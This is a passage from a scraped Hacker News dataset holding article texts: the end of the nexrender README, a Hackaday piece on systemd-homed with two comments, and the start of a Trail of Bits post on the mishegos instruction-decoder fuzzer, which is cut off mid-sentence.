ones minimal dependency, as you might've noticed, packages in nexrender try to have as little dependencies as possible making it much easier to maintain and develop The recommended approach is to add only needed things as dependencies, it's better to take some time to research module that is being added to the project, to see how many its own dependencies it will introduce, and possibly find a better and smaller one, or even extract some specific feature into a new micro module. And of course, the main thing about development is that it should be fun. :) Project Values This project has a few principle-based goals that guide its development: Do our thing really well. Our thing is data-based automating of the rendering, and hanlding other interactive related components of that task set. It is not meant to be a replacement for specific corporate tools templater bot, rendergarden, etc. that have lots of features and customizability. (Some customizability is OK, but not to the extent that it becomes overly complicated or error-prone.) Limit dependencies. Keep the packages lightweight. Pure nodejs. This means no native module or other external/system dependencies. This package should be able to stand on its own and cross-compile easily to any platform -- and that includes its library dependencies. Idiomatic nodejs. Keep modules small, minimal exported names, promise based async handling. Be elegant. This package should be elegant to use and its code should be elegant when reading and testing. If it doesn't feel good, fix it up. Well-documented. Use comments prudently; explain why non-obvious code is necessary (and use tests to enforce it). Keep the docs updated, and have examples where helpful. Keep it efficient. This often means keep it simple. Fast code is valuable. Consensus. Contributions should ideally be approved by multiple reviewers before being merged. Generally, avoid merging multi-chunk changes that do not go through at least one or two iterations/reviews. Except for trivial changes, PRs are seldom ready to merge right away. Have fun contributing. Coding is awesome! Awesome External Packages Here you can find a list of packages published by other contributors: HarryLafranc/nexrender-action-handbrake - Encode a video with Handbrake on nexrender-postrender dberget/nexrender-action-cloudinary - Upload a video to Cloudinary platform dberget/nexrender-action-normalize-color - Normalize colors for each asset defined in options dylangarcia/nexrender-action-unzip - Unzip composition source before starting to render pilskalns/nexrender-action-template-unzip - Unzip template and find (first) .aep file within it. Minimal config. somename/package-name - a nice description of a nice package doing nice things Since nexrender allows to use external packages installed globally from npm, its quite easy to add your own modules Awesome Related Projects Jeewes/nerc - NERC: Tool for filling nexrender config templates with CSV data. newflight-co/createvid - A fully functional, full-stack web app built in Vue. Actively looking for community support. Custom Actions To add a custom pre- or post-render action, all you need to do is to create at least a single file, that is going to return a function with promise. // mymodule.js module.exports = (job, settings, action, type) => { console.log('hello from my module: ' + action.module); return Promise.resolve(); } To use that action locally you can then require it by either using relative or global path. Additionally you can create a private npm module and link it, so it would become visible globally or even publish it to npm/your own private repo and use it. // example 1 { \"module\": \"d:/myprojects/mymodule/index.js\", \"somearg1\": \"hello world\", \"somearg2\": 123456 } // example 2 { \"module\": \"my-super-cool-module\", \"somearg1\": \"hello world\", \"somearg2\": 123456 } // example 3 { \"module\": \"@myorg/mymodule\", \"somearg1\": \"hello world\", \"somearg2\": 123456 } From there you can build pretty much any module that could process downloaded data before starting rendering, or doing tranformations on data after, or just simply sending an email when rendering is finished. Note: both job and settings are mutable structures, any modifications made to them will reflect onto the flow of the next calls. Hence they can be used to store state between actions. Migrating from v0.x First version of nexrender was published in 2016, and it has been used by many people for quite some time since then. Even though version v1.x is based on the same concepts, it introduces major breaking changes that are incompatible with older version. However, majority of those changes were made to allow new, previously unimaginable things. Naming Nexrender Project -> Nexrender Job Nexrender Rendernode -> Nexrender Worker Nexrender API Server -> Nexrender Server Referring to project was confusing since it could be applied for both aep project and nexrender project. And rendernode name was quite too long, and unconvinient to use. Structure The structure of the job has changed, majority of the fields were moved from the root namespace, into \"template\" namespace, merging it with old \"project.settings\" namespace. Assets structure remained pretty much similar. A new object actions has been introduced. Assets Replaced http and file only assets to a URI based links, theoretically extendable without any limits. Many new other protocols and implementations can be added in a decentrilized manner. Strict division between asset types: [image, audio, video] - footage items, behave like files [data] - dynamic data assets, for direct value setting and expressions [script] - files allowing full scripting limitless scripting support Rendering The biggest change that happened, is removal of old hacky way of replacing assets and patching aepx file to write custom expressions. Instead it has been replaced with brand new, recently discovered ExtendScript based injection. It allows to do a few quite important things: Import and replace footage items via scripting, making it very reliable. (No more bugs related to same-system existing path override for aep project) Set/Replace text, expressins and other types of data via scripting. (No more bugs related to changes in aepx structure, and no need to use aepx format at all) Ability to run custom ExtendScript jsx scripts, which is limitless and revolutionary compared to previous version. CLI Project has been devided onto multiple subprojects, and mutiple cli applications as a result. Every cli application is auto-compiled to a platform specific executable on publish and auto-uploaded to the releases section. This allows anyone to use nexrender cli without installing a nodejs runtime onto target system. New CLI tool allows to run render directly from console for a local job, without need to start whole cluster. Worker, and CLI apps include minor QoL improvments, such as auto creation of the ae_render_only_node.txt file that allows free licensing, and After Effects folder auto detection. All tools include better help screen, and a lot of customization from command line arguments. Customers Technically, since the tool is free, customers should be called users. In any case this section describes a list of users or companies that are proud users of nexrender. If you've used nexrender, and you like it, please feel free to add yourself into the list. Noxcaos Music Two Bit Circus Flgerl NewFlight you name goes here Plans Features for next major release (v2.0.0): Ability to switch renderers for a job (none, aerender, media-encoder) Ability to push a job onto a server with ability to auto-split and render parts independently on the network API for tracking/managing active workers in the network Algo of splitting based on time & amount of workers New job type (partitioned), which would be excluded from some general API responses Mechanism of selecting a single node to be the \"finisher\", that would await and merge results of other jobs Possible names: @nexrender/action-merge-parent, @nexrender/action-merge-child Extend current scripting capabilities with an advanced real-time communication with the internal environment via TCP connection Define a general abstract inteface for the actions, and a general package that would contain basic funcitonality like input/output arguments, etc. Re-design networking layer, as well as server database layer, to count in cases where the jobs can be huge json objects. Create automated footage detection and asset generator Contributors Code Contributors This project exists thanks to all the people who contribute. [Contribute]. Financial Contributors Become a financial contributor and help us sustain our community. [Contribute] Individuals Organizations Support this project with your organization. Your logo will show up here with a link to your website. [Contribute] ",
        "_version_": 1718527431076216832
      },
      {
        "story_id": [21270861],
        "story_author": ["slowhand09"],
        "story_descendants": [3],
        "story_score": [17],
        "story_time": ["2019-10-16T14:41:57Z"],
        "story_title": "Pack Your Bags – Systemd Is Taking You to a New Home",
        "search": [
          "Pack Your Bags – Systemd Is Taking You to a New Home",
          "https://hackaday.com/2019/10/16/pack-your-bags-systemd-is-taking-you-to-a-new-home/",
          "Home directories have been a fundamental part on any Unixy system since day one. Theyre such a basic element, we usually dont give them much thought. And why would we? From a low level point of view, whatever location $HOME is pointing to, is a directory just like any other of the countless ones you will find on the system apart from maybe being located on its own disk partition. Home directories are so unspectacular in their nature, it wouldnt usually cross anyones mind to even consider to change anything about them. And then theres Lennart Poettering. In case youre not familiar with the name, he is the main developer behind the systemd init system, which has nowadays been adopted by the majority of Linux distributions as replacement for its oldschool, Unix-style init-system predecessors, essentially changing everything we knew about the system boot process. Not only did this change personally insult every single Perl-loving, Ken-Thompson-action-figure-owning grey beard, it engendered contempt towards systemd and Lennart himself that approaches Nickelback level. At this point, it probably doesnt matter anymore what he does next, haters gonna hate. So who better than him to disrupt everything we know about home directories? Where you _live_? Although, home directories are just one part of the equation that his latest creation the systemd-homed project is going to make people hate him even more tackle. The big picture is really more about the whole concept of user management as we know it, which sounds bold and scary, but which in its current state is also a lot more flawed than we might realize. So lets have a look at what its all about, the motivation behind homed, the problems its going to both solve and raise, and how its maybe time to leave some outdated philosophies behind us. A Quick Introduction To Systemd Just one more module Image: Shmuel Csaba Otto Traian [CC BY-SA 3.0], via Wikimedia CommonsBefore we get into the homed part of the endeavor, lets bring everyone on the same page about systemd itself. In simple words, systemd handles everything that lies beyond the kernels tasks to start up the system: setting up the user space and providing everything required to get all system processes and daemons running, and managing those processes along the way. Its both replacing the old init process running with PID 1, and providing an administrative layer between the kernel and user space, and as such, is coming with a whole suite of additional tools and components to achieve all that: system logger, login handling, network management, IPC for communication between each part, and so on. So, what was once handled by all sorts of single-purpose tools has since become part of systemd itself, which is one source of resentment from people latching on to the one tool, one job philosophy. Technically, each tool and component in systemd is still shipped as its own executable, but due to interdependency of these components theyre not really that standalone, and its really more just a logical separation. systemd-homed is therefore one additional such component, aimed to handle the user management and the home directories of those users, tightly integrated into the systemd infrastructure and all the additional services it provides. But why change it at all? Well, lets have a look at the current way users and home directories are handled in Linux, and how systemd-homed is planning to change that. The Status Quo Of $HOME And User Management Since the beginning of time, users have been stored in the /etc/passwd file, which includes among other things the username, a system-unique user id, and the home directory location. Traditionally, the users password was also stored in hashed form in that file and it might still be the case on some, for example embedded systems but was eventually moved to a separate /etc/shadow file, with more restricted file permissions. So, after successfully logging in to the system with the password found in the shadow file, the user starts off in whichever location the home directory entry in /etc/passwd is pointing to. Sure you want to live here? Rosedale homeby Sheba_Also,CC BY-SA 2.0 In other words, for the most fundamental process of logging in to a system, three individual parts that are completely independent and separated from each other are required. Thanks to well-defined rules that stem from simpler times and have since remained mostly untouched, and which every system and tool involved in the process commendably abides by, this has worked out just fine. But if we think about it: is this really the best possible approach? Note that this is just the most basic local user login. Throw in some network authentication, additional user-based resource management, or disk encryption, and you will notice that /etc/passwd isnt the place for any of that. And well, why would it be one tool, one job, right? As a result, instead of configuring everything possibly related to a user in one centralized user management system that is flexible enough for any present and future considerations, we just stack dozens of random configurations on top of and next to each other, with each one of them doing their own little thing. And we are somehow perfectly fine and content with that. Yet, if you had to design a similar system today from scratch, would you really opt for the same concept? Would your system architect, your teacher, or even you yourself really be fine with duplicate database entries (usernames both in passwd and shadow file), unenforced relationships (home directory entry and home directory itself), and just random additional data without rhyme or reason: resource management, PAM, network authentication, and so on? Well, as you may have guessed by now, Lennart Poettering isnt much a fan of that, and with systemd-homed he is aiming to unite all the separate configuration entities around user management into one centralized system, flexible enough to handle everything the future might require. Knock Knock Its Systemd So instead of each component having its own configuration for all users, systemd-homed is going to collect all the configuration data of each component based on the user itself, and store it in a user-specific record in form of a JSON file. The file will include all the obvious information such as username, group membership, and password hashes, but also any user-dependent system configurations and resource management information, and essentially really just anything relevant. Being JSON, it can virtually contain whatever you want to put there, meaning it is easily extendable whenever new features and capabilities are required. No need to wonder anymore which of those three dozen files you need to touch if you want to change something. In addition to user and user-based system management, the home directory itself will be linked to it as a LUKS encrypted container and this is where the interesting part comes, even if you dont see a need for a unified configuration place: the encryption is directly coupled to the user login itself, meaning not only is the disk automatically decrypted once the user logs in, it is equally automatic encrypted again as soon as the user logs out, locks the screen, or suspends the device. In other words, your data is inaccessible and secure whenever youre not logged in, while the operating system can continue to operate independently from that. There is, of course, one downside to that. Chicken / Egg Problem With SSH If the home directory requires an actively logged-in user to decrypt the home directory, theres going to be a problem with remote logins via SSH that depend on the SSH decryption key found inside the (at that point encrypted) home directory. For that reason, SSH simply wont work without a logged in local user, which of course defies the whole point of remote access. The OpenSSH logo. That being said, its worth noting that at this stage, systemd-homed is focusing mostly on regular, real human users on a desktop or laptop, and not so much system or service-specific users, or anything running remotely on a server. That sounds of course like a bad excuse, but keep also in mind that systemd-homed will change the very core of user handling, so its probably safe to assume that future iterations will diminish that separation and things will work properly for either type of user. I mean, no point to reinvent the wheel if you need to keep the old one around as well but feel free to call me naive here. Ideally, the SSH keys would be migrated to the common-place user management record, but that would require some work on SSHs side. This isnt happening right now, but then again, systemd-homed itself is also just a semi-implemented idea in a git branch at this point. Its unlikely going to be widely adapted and forced onto you by the evil Linux distributions until this issue in particular is solved but again, maybe Im just overly optimistically naive. Self-Contained Users With Portable Homes But with user management and home directory handling in a single place and coupled together, you can start to dream of additional possible features. For instance, portable home directories that double as self-contained users. What that means is that you could keep the home directory for example on a USB stick or external disk, and seamlessly move it between, say, your workstation at home and your laptop whenever youre on the move. No need to duplicate or otherwise sync your data, its all in one place with you. This brings security and portability benefits. Or would you rather live here? By ltenney1225 CC BY-NC 2.0 But thats not all. It wouldnt have to be your own device you can attach your home directory to, it could be a friends device or the presenter laptop at a conference or really any compatible device. As soon as you plug in your home directory into it, your whole user will automatically exist on that device as well. Well, sort of automatically. Obviously, no one would want some random people roaming around on their system, so the system owner / superuser will still have to grant you access to their system first, with a user and resource configuration based on their own terms, and signed to avoid tempering. Admittedly, for some of you, this might all sound less like amazing new features and more like a security nightmare and mayhem just waiting to happen. And it most certainly will bring a massive change to yet another core element of Linux where a lot could possibly go wrong. How it will all play out in reality remains to be seen. Clearly it wont happen over night, and it wont happen out of nowhere either the changes are just too deep and fundamental. But being part of systemd itself, and seeing its influence on Linux, one has to entertain the idea that this might happen one day in the not too distant future. And maybe it should. Times Are Changing Yes, this will disrupt everything we know about user management. And yes, it goes against everything Unix stands for. But it also gets rid of an ancient concept that goes against everything the software engineering world has painfully learned as best practices over all these decades since. After all, its neither the 70s nor the 80s anymore. We dont have wildly heterogeneous environments anymore where we need to find the least capable common denominator for each and every system anymore. Linux is the dominant, and arguably the only really relevant open source Unix system nowadays even Netflix and WhatsApp running FreeBSD is really more anecdotal in comparison. So why should Linux really care about compatibility with niche operating systems that are in the end anyway going to do their own thing? And for that matter, why should we still care about Unix altogether? It generally begs the question, why do we keep on insisting that computer science as a discipline has reached its philosophical peak in a time the majority of its current practitioners werent even born yet? Why are we so frantically holding on to a philosophy that was established decades before the world of today with its ubiquitous internet, mobile connectivity, cloud computing, Infrastructure/Platform/Software/Whatnot-as-a-Service, and everything on top and below that has become reality? Are we really that nostalgic about the dark ages? Im not saying that the complexity we have reached with technology is necessarily an outcome we should have all hoped for, but it is where we are today. And its only going to get worse. The sooner we accept that and move on from here, and maybe adjust our ancient philosophies along the way, the higher the chance that we will actually manage to tame this development and keep control over it. Yes, change is a horrible, scary, and awful thing if its brought upon us by anyone else but ourselves. But its also inevitable, and systemd-homed might just be the proverbial broken egg that will give us a delicious omelette here. Time will tell. ",
          "The idea (portable homes) that I could ssh into a system and have my home directory come with me (with a personal vim config, shell, gitconfig, etc) on any newer Linux machine is very exciting",
          "> user-specific record in form of a JSON file<p>Can we please not do any more json at the command line? The age of Xml was terrible enough. Key/value pairs please"
        ],
        "story_type": ["Normal"],
        "url": "https://hackaday.com/2019/10/16/pack-your-bags-systemd-is-taking-you-to-a-new-home/",
        "comments.comment_id": [21272243, 21272779],
        "comments.comment_author": ["dickeytk", "exabrial"],
        "comments.comment_descendants": [0, 0],
        "comments.comment_time": [
          "2019-10-16T16:30:29Z",
          "2019-10-16T17:12:09Z"
        ],
        "comments.comment_text": [
          "The idea (portable homes) that I could ssh into a system and have my home directory come with me (with a personal vim config, shell, gitconfig, etc) on any newer Linux machine is very exciting",
          "> user-specific record in form of a JSON file<p>Can we please not do any more json at the command line? The age of Xml was terrible enough. Key/value pairs please"
        ],
        "id": "26fca36f-cf5d-4edd-b4d8-92040f1c30a4",
        "url_text": "Home directories have been a fundamental part on any Unixy system since day one. Theyre such a basic element, we usually dont give them much thought. And why would we? From a low level point of view, whatever location $HOME is pointing to, is a directory just like any other of the countless ones you will find on the system apart from maybe being located on its own disk partition. Home directories are so unspectacular in their nature, it wouldnt usually cross anyones mind to even consider to change anything about them. And then theres Lennart Poettering. In case youre not familiar with the name, he is the main developer behind the systemd init system, which has nowadays been adopted by the majority of Linux distributions as replacement for its oldschool, Unix-style init-system predecessors, essentially changing everything we knew about the system boot process. Not only did this change personally insult every single Perl-loving, Ken-Thompson-action-figure-owning grey beard, it engendered contempt towards systemd and Lennart himself that approaches Nickelback level. At this point, it probably doesnt matter anymore what he does next, haters gonna hate. So who better than him to disrupt everything we know about home directories? Where you _live_? Although, home directories are just one part of the equation that his latest creation the systemd-homed project is going to make people hate him even more tackle. The big picture is really more about the whole concept of user management as we know it, which sounds bold and scary, but which in its current state is also a lot more flawed than we might realize. So lets have a look at what its all about, the motivation behind homed, the problems its going to both solve and raise, and how its maybe time to leave some outdated philosophies behind us. A Quick Introduction To Systemd Just one more module Image: Shmuel Csaba Otto Traian [CC BY-SA 3.0], via Wikimedia CommonsBefore we get into the homed part of the endeavor, lets bring everyone on the same page about systemd itself. In simple words, systemd handles everything that lies beyond the kernels tasks to start up the system: setting up the user space and providing everything required to get all system processes and daemons running, and managing those processes along the way. Its both replacing the old init process running with PID 1, and providing an administrative layer between the kernel and user space, and as such, is coming with a whole suite of additional tools and components to achieve all that: system logger, login handling, network management, IPC for communication between each part, and so on. So, what was once handled by all sorts of single-purpose tools has since become part of systemd itself, which is one source of resentment from people latching on to the one tool, one job philosophy. Technically, each tool and component in systemd is still shipped as its own executable, but due to interdependency of these components theyre not really that standalone, and its really more just a logical separation. systemd-homed is therefore one additional such component, aimed to handle the user management and the home directories of those users, tightly integrated into the systemd infrastructure and all the additional services it provides. But why change it at all? Well, lets have a look at the current way users and home directories are handled in Linux, and how systemd-homed is planning to change that. The Status Quo Of $HOME And User Management Since the beginning of time, users have been stored in the /etc/passwd file, which includes among other things the username, a system-unique user id, and the home directory location. Traditionally, the users password was also stored in hashed form in that file and it might still be the case on some, for example embedded systems but was eventually moved to a separate /etc/shadow file, with more restricted file permissions. So, after successfully logging in to the system with the password found in the shadow file, the user starts off in whichever location the home directory entry in /etc/passwd is pointing to. Sure you want to live here? Rosedale homeby Sheba_Also,CC BY-SA 2.0 In other words, for the most fundamental process of logging in to a system, three individual parts that are completely independent and separated from each other are required. Thanks to well-defined rules that stem from simpler times and have since remained mostly untouched, and which every system and tool involved in the process commendably abides by, this has worked out just fine. But if we think about it: is this really the best possible approach? Note that this is just the most basic local user login. Throw in some network authentication, additional user-based resource management, or disk encryption, and you will notice that /etc/passwd isnt the place for any of that. And well, why would it be one tool, one job, right? As a result, instead of configuring everything possibly related to a user in one centralized user management system that is flexible enough for any present and future considerations, we just stack dozens of random configurations on top of and next to each other, with each one of them doing their own little thing. And we are somehow perfectly fine and content with that. Yet, if you had to design a similar system today from scratch, would you really opt for the same concept? Would your system architect, your teacher, or even you yourself really be fine with duplicate database entries (usernames both in passwd and shadow file), unenforced relationships (home directory entry and home directory itself), and just random additional data without rhyme or reason: resource management, PAM, network authentication, and so on? Well, as you may have guessed by now, Lennart Poettering isnt much a fan of that, and with systemd-homed he is aiming to unite all the separate configuration entities around user management into one centralized system, flexible enough to handle everything the future might require. Knock Knock Its Systemd So instead of each component having its own configuration for all users, systemd-homed is going to collect all the configuration data of each component based on the user itself, and store it in a user-specific record in form of a JSON file. The file will include all the obvious information such as username, group membership, and password hashes, but also any user-dependent system configurations and resource management information, and essentially really just anything relevant. Being JSON, it can virtually contain whatever you want to put there, meaning it is easily extendable whenever new features and capabilities are required. No need to wonder anymore which of those three dozen files you need to touch if you want to change something. In addition to user and user-based system management, the home directory itself will be linked to it as a LUKS encrypted container and this is where the interesting part comes, even if you dont see a need for a unified configuration place: the encryption is directly coupled to the user login itself, meaning not only is the disk automatically decrypted once the user logs in, it is equally automatic encrypted again as soon as the user logs out, locks the screen, or suspends the device. In other words, your data is inaccessible and secure whenever youre not logged in, while the operating system can continue to operate independently from that. There is, of course, one downside to that. Chicken / Egg Problem With SSH If the home directory requires an actively logged-in user to decrypt the home directory, theres going to be a problem with remote logins via SSH that depend on the SSH decryption key found inside the (at that point encrypted) home directory. For that reason, SSH simply wont work without a logged in local user, which of course defies the whole point of remote access. The OpenSSH logo. That being said, its worth noting that at this stage, systemd-homed is focusing mostly on regular, real human users on a desktop or laptop, and not so much system or service-specific users, or anything running remotely on a server. That sounds of course like a bad excuse, but keep also in mind that systemd-homed will change the very core of user handling, so its probably safe to assume that future iterations will diminish that separation and things will work properly for either type of user. I mean, no point to reinvent the wheel if you need to keep the old one around as well but feel free to call me naive here. Ideally, the SSH keys would be migrated to the common-place user management record, but that would require some work on SSHs side. This isnt happening right now, but then again, systemd-homed itself is also just a semi-implemented idea in a git branch at this point. Its unlikely going to be widely adapted and forced onto you by the evil Linux distributions until this issue in particular is solved but again, maybe Im just overly optimistically naive. Self-Contained Users With Portable Homes But with user management and home directory handling in a single place and coupled together, you can start to dream of additional possible features. For instance, portable home directories that double as self-contained users. What that means is that you could keep the home directory for example on a USB stick or external disk, and seamlessly move it between, say, your workstation at home and your laptop whenever youre on the move. No need to duplicate or otherwise sync your data, its all in one place with you. This brings security and portability benefits. Or would you rather live here? By ltenney1225 CC BY-NC 2.0 But thats not all. It wouldnt have to be your own device you can attach your home directory to, it could be a friends device or the presenter laptop at a conference or really any compatible device. As soon as you plug in your home directory into it, your whole user will automatically exist on that device as well. Well, sort of automatically. Obviously, no one would want some random people roaming around on their system, so the system owner / superuser will still have to grant you access to their system first, with a user and resource configuration based on their own terms, and signed to avoid tempering. Admittedly, for some of you, this might all sound less like amazing new features and more like a security nightmare and mayhem just waiting to happen. And it most certainly will bring a massive change to yet another core element of Linux where a lot could possibly go wrong. How it will all play out in reality remains to be seen. Clearly it wont happen over night, and it wont happen out of nowhere either the changes are just too deep and fundamental. But being part of systemd itself, and seeing its influence on Linux, one has to entertain the idea that this might happen one day in the not too distant future. And maybe it should. Times Are Changing Yes, this will disrupt everything we know about user management. And yes, it goes against everything Unix stands for. But it also gets rid of an ancient concept that goes against everything the software engineering world has painfully learned as best practices over all these decades since. After all, its neither the 70s nor the 80s anymore. We dont have wildly heterogeneous environments anymore where we need to find the least capable common denominator for each and every system anymore. Linux is the dominant, and arguably the only really relevant open source Unix system nowadays even Netflix and WhatsApp running FreeBSD is really more anecdotal in comparison. So why should Linux really care about compatibility with niche operating systems that are in the end anyway going to do their own thing? And for that matter, why should we still care about Unix altogether? It generally begs the question, why do we keep on insisting that computer science as a discipline has reached its philosophical peak in a time the majority of its current practitioners werent even born yet? Why are we so frantically holding on to a philosophy that was established decades before the world of today with its ubiquitous internet, mobile connectivity, cloud computing, Infrastructure/Platform/Software/Whatnot-as-a-Service, and everything on top and below that has become reality? Are we really that nostalgic about the dark ages? Im not saying that the complexity we have reached with technology is necessarily an outcome we should have all hoped for, but it is where we are today. And its only going to get worse. The sooner we accept that and move on from here, and maybe adjust our ancient philosophies along the way, the higher the chance that we will actually manage to tame this development and keep control over it. Yes, change is a horrible, scary, and awful thing if its brought upon us by anyone else but ourselves. But its also inevitable, and systemd-homed might just be the proverbial broken egg that will give us a delicious omelette here. Time will tell. ",
        "_version_": 1718527431587921921
      },
      {
        "story_id": [21408741],
        "story_author": ["woodruffw"],
        "story_descendants": [111],
        "story_score": [180],
        "story_time": ["2019-10-31T13:53:46Z"],
        "story_title": "Destroying x86_64 instruction decoders with differential fuzzing",
        "search": [
          "Destroying x86_64 instruction decoders with differential fuzzing",
          "https://blog.trailofbits.com/2019/10/31/destroying-x86_64-instruction-decoders-with-differential-fuzzing/",
          "TL;DR: x86_64 decoding is hard, and the number and variety of implementations available for it makes it uniquely suited to differential fuzzing. Were open sourcing mishegos, a differential fuzzer for instruction decoders. You can use it to discover discrepancies in your own decoders and analysis tools! Figure 1: Some of Mishegoss output, visualized. In the beginning, there was instruction decoding Decompilation and reverse engineering tools are massive, complicated beasts that deal with some of the hardest problems in binary analysis: variable type and layout recovery, control flow graph inference, and sound lifting to higher-order representations for both manual and automated inspection. At the heart of each of these tasks is accurate instruction decoding. Automated tools require faithful extraction of instruction semantics to automate their analyses, and reverse engineers expect accurate disassembly listings (or well-defined failure modes) when attempting manual comprehension. Instruction decoding is implicitly treated as a solved problem. Analysis platforms give analysts a false sense of confidence by encouraging them to treat disassembled output as ground truth, without regarding potential errors in the decoder or adversarial instruction sequences in the input. Mishegos challenges this assumption. (x86_64) Instruction decoding is hard Like, really hard: Unlike RISC ISAs such as ARM and MIPS, x86_64 has variable-length instructions, meaning that decoder implementations must incrementally parse the input to know how many bytes to fetch. An instruction can be anywhere between 1 byte (e.g., 0x90, nop) and 15 bytes long. Longer instructions may be semantically valid (i.e., they may describe valid combinations of prefixes, operations, and literals), but actual silicon implementations will only fetch and decode 15 bytes at most (see the Intel x64 Developers Manual, 2.3.11). x86_64 is the 64-bit extension of a 32-bit extension of a 40-year-old 16-bit ISA designed to be source-compatible with a 50-year-old 8-bit ISA. In short, its a mess, with each generation adding and removing functionality, reusing or overloading instructions and instruction prefixes, and introducing increasingly complicated switching mechanisms between supported modes and privilege boundaries. Many instruction sequences have overloaded interpretations or plausible disassemblies, depending on the active processors state or compatibility mode. Disassemblers are required to make educated guesses, even when given relatively precise information about the compilation target or the expected execution mode. The complexity of the x86_64 instruction format is especially apparent when visualized: Figure 2: Visualizing some of x86_64s complexity. Even the graphic above doesnt fully capture x86_64s nuancesit ignores the internal complexity of the ModR/M and scale-index-base (SIB) bytes, as well as the opcode extension bit and various escaping formats for extended opcodes (legacy escape prefixes, VEX escape, and XOP escape). All told, these complexities make x86_64 decoder implementations uniquely amenable to testing via differential fuzzingby hooking a mutation engine up to several different implementations at once and comparing each collection of outputs, we can quickly suss out bugs and missing functionality. Building a sliding mutation engine for x86_64 instructions Given this layout and our knowledge about minimum and maximum instruction lengths on x86_64, we can construct a mutation engine that probes large parts of the decoding pipeline with a sliding strategy: Generate an initial instruction candidate of up to 26 bytes, including structurally valid prefixes and groomed ModR/M and SIB fields. Extract each window of the candidate, where each window is up to 15 bytes beginning at index 0 and moving to the right. Once all windows are exhausted, generate a new instruction candidate and repeat. Why up to 26 bytes? See above! x86_64 decoders will only accept up to 15 bytes, but generating long, (potentially) semantically valid x86_64 instruction candidates that we slide through means we can test likely edge cases in decoding: Failing to handle multiple, duplicate instruction prefixes. Emitting nonsense prefixes or disassembly attributes (e.g., accepting and emitting a repeat prefix on a non-string operation, or the lock prefix on something that isnt atomizable). Failing to parse the ModR/M or SIB bytes correctly, causing incorrect opcode decoding or bad displacement/immediate scaling/indexing. so, a maximal instruction candidate, shown in purple (with dummy displacement and immediate values, shown in grey) like f0 f2 2e 67 46 0f 3a 7a 22 8e 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f Figure 3: A maximal instruction candidate. yields 12 window candidates for actual fuzzing. f0 f2 2e 67 46 0f 3a 7a 22 8e 00 01 02 03 04 f2 2e 67 46 0f 3a 7a 22 8e 00 01 02 03 04 05 2e 67 46 0f 3a 7a 22 8e 00 01 02 03 04 05 06 67 46 0f 3a 7a 22 8e 00 01 02 03 04 05 06 07 46 0f 3a 7a 22 8e 00 01 02 03 04 05 06 07 08 0f 3a 7a 22 8e 00 01 02 03 04 05 06 07 08 09 3a 7a 22 8e 00 01 02 03 04 05 06 07 08 09 0a 7a 22 8e 00 01 02 03 04 05 06 07 08 09 0a 0b 22 8e 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 8e 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f Figure 4: Extracted instruction candidates. Consequently, our mutation engine spends a lot of time trying out different sequences of prefixes and flags, and relatively little time interacting with the (mostly irrelevant) displacement and immediate fields. Mishegos takes the sliding approach above and integrates it into a pretty typical differential fuzzing scheme. Each fuzzing target is wrapped into a worker process with a well-defined ABI: worker_ctor and worker_dtor: Worker setup and teardown functions, respectively. try_decode: Called for each input sample, returns the decoders results along with some metadata (e.g., how many bytes of input were consumed, the status of the decoder). worker_name: A constant string used to uniquely identify the type of worker. The codebase currently implements five workers: CapstoneA popular disassembly framework originally based on the LLVM projects disassemblers. libbfd/libopcodesThe backing libraries used by the popular GNU binutils. udis86An older, potentially unmaintained decoder (last commit 2014). XEDIntels reference decoder. ZydisAnother popular open source disassembly library, with an emphasis on speed and feature-completeness. Because of the barebones ABI, Mishegos workers tend to be extremely simple. The worker for Capstone, for example, is just 32 lines: #include <capstone/capstone.h> #include \"../worker.h\" static csh cs_hnd; char *worker_name = \"capstone\"; void worker_ctor() { if (cs_open(CS_ARCH_X86, CS_MODE_64, &cs_hnd) != CS_ERR_OK) { errx(1, \"cs_open\"); } } void worker_dtor() { cs_close(&cs_hnd); } void try_decode(decode_result *result, uint8_t *raw_insn, uint8_t length) { cs_insn *insn; size_t count = cs_disasm(cs_hnd, raw_insn, length, 0, 1, &insn); if (count > 0) { result->status = S_SUCCESS; result->len = snprintf(result->result, MISHEGOS_DEC_MAXLEN, \"%s %s\\n\", insn[0].mnemonic, insn[0].op_str); result->ndecoded = insn[0].size; cs_free(insn, count); } else { result->status = S_FAILURE; } } Figure 5: Source for the Capstone worker. Behind the scenes, workers receive inputs and send outputs in parallel via slots, which are accessed through a shared memory region managed by the fuzzing engine. Input slots are polled via semaphores to ensure that each worker has retrieved a candidate for decoding; output slots are tagged with the workers name and instruction candidate to allow for later collection into cohorts. The result is a relatively fast differential engine that doesnt require each worker to complete a particular sample before continuing: Each worker can consume inputs at its own rate, with only the number of output slots and cohort collection limiting overall performance. The birds-eye view: Figure 6: Mishegoss architecture. Making sense of the noise Mishegos produces a lot of output: A single 60-second run on a not particularly fast Linux server (inside of Docker!) produces about 1 million cohorts, or 4 million bundled outputs (1 output per input per fuzzing worker with 4 workers configured): Figure 7: An example Mishegos run. Each output cohort is structured as a JSON blob, and looks something like this: { \"input\": \"3626f3f3fc0f587c22\", \"outputs\": [ { \"ndecoded\": 5, \"len\": 21, \"result\": \"ss es repz repz cld \\n\", \"workerno\": 0, \"status\": 1, \"status_name\": \"success\", \"worker_so\": \"./src/worker/bfd/bfd.so\" }, { \"ndecoded\": 5, \"len\": 5, \"result\": \"cld \\n\", \"workerno\": 1, \"status\": 1, \"status_name\": \"success\", \"worker_so\": \"./src/worker/capstone/capstone.so\" }, { \"ndecoded\": 5, \"len\": 4, \"result\": \"cld \", \"workerno\": 2, \"status\": 1, \"status_name\": \"success\", \"worker_so\": \"./src/worker/xed/xed.so\" }, { \"ndecoded\": 5, \"len\": 3, \"result\": \"cld\", \"workerno\": 3, \"status\": 1, \"status_name\": \"success\", \"worker_so\": \"./src/worker/zydis/zydis.so\" } ] } Figure 8: An example output cohort from Mishegos. In this case, all of the decoders agree: The first five bytes of the input decode to a valid cld instruction. libbfd is extra eager and reports the (nonsense) prefixes, while the others silently drop them as irrelevant. But consistent successes arent what were interested inwe want discrepancies, dammit! Discrepancies can occur along a few dimensions: One or more decoders disagree about how many bytes to consume during decoding, despite all reporting success. One or more decoders report failure (or success), in contrast to others. All decoders report success and consume the same number of input bytes, but one or more disagree about a significant component of the decoding (e.g., the actual opcode or immediate/displacement values). Each of these has adversarial applications: Decoding length discrepancies can cause a cascade of incorrect disassemblies, preventing an automated tool 